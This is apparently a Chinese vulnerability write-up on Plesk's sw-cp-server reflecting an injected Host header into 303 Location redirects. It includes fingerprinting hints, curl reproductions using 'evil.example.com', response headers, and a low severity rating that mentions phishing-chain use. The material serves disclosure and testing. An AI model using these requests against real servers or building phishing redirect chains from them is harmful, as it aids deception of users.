# Plesk sw-cp-server 303 Location 反射 Host 头（开放重定向形态）

## 指纹
Server: sw-cp-server / X-Powered-By: PleskLin（443）
8443 常由 nginx 前置，Server: nginx，但 Location 生成逻辑相同
Cookie/页面：login.php、login_up.php、P3p 头为 Plesk 特征

## 最小复现（443）
# Host 注入
curl -sk -D - -o /dev/null --resolve mail.example.com:443:<IP> \
     -H 'Host: evil.example.com' https://mail.example.com/smb/

HTTP/1.1 303 See Other
Cache-Control: no-store, no-cache, must-revalidate
Expires: Fri, 28 May 1999 00:00:00 GMT
Location: https://evil.example.com/login.php?success_redirect_url=%2Fsmb%2F
P3p: CP="NON COR CURa ADMa OUR NOR UNI COM NAV STA"
Pragma: no-cache
Server: sw-cp-server
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Powered-By: PleskLin
X-Xss-Protection: 1; mode=block

# 基线对照
curl -sk -D - -o /dev/null --resolve mail.example.com:443:<IP> \
     -H 'Host: mail.example.com' https://mail.example.com/smb/
→ Location: https://mail.example.com/login.php?success_redirect_url=%2Fsmb%2F

# /phpmyadmin/ 同型
curl -sk -D - -o /dev/null --resolve mail.example.com:443:<IP> \
     -H 'Host: evil.example.com' https://mail.example.com/phpmyadmin/
→ Location: https://evil.example.com/login.php?success_redirect_url=%2Fphpmyadmin%2F

## 8443（nginx 前端）
curl -sk -D - -o /dev/null --resolve mail.example.com:8443:<IP> \
     -H 'Host: evil.example.com' https://mail.example.com:8443/smb/
→ HTTP/2 303
   location: https://evil.example.com/login.php?success_redirect_url=%2Fsmb%2F

curl -sk -D - -o /dev/null --resolve mail.example.com:8443:<IP> \
     -H 'Host: mail.example.com' https://mail.example.com:8443/smb/
→ location: https://mail.example.com:8443/login.php?success_redirect_url=%2Fsmb%2F

## 边界反证
curl -sk -D - -o /dev/null --resolve mail.example.com:443:<IP> \
  'https://mail.example.com/login.php?success_redirect_url=https%3A%2F%2Fevil.example%2Fpwn'
→ 303 Location: https://mail.example.com/login_up.php?success_redirect_url=https%3A%2F%2Fevil.example%2Fpwn
（未认证下外部 URL 仅作为参数被保留，不执行外跳）

## 结论与限制
- Location 的 scheme+host 取自请求 Host 头，任意主机被反射 → 开放重定向形态（CWE-601）。
- 响应带 Cache-Control: no-store / Pragma: no-cache → 不能升级为缓存投毒。
- 浏览器直连无法自定义 Host，需 curl --resolve / 中间代理，故评为 low。
- 可用于构造指向 Plesk 自身路径的可信域跳转链，配合钓鱼/社工场景。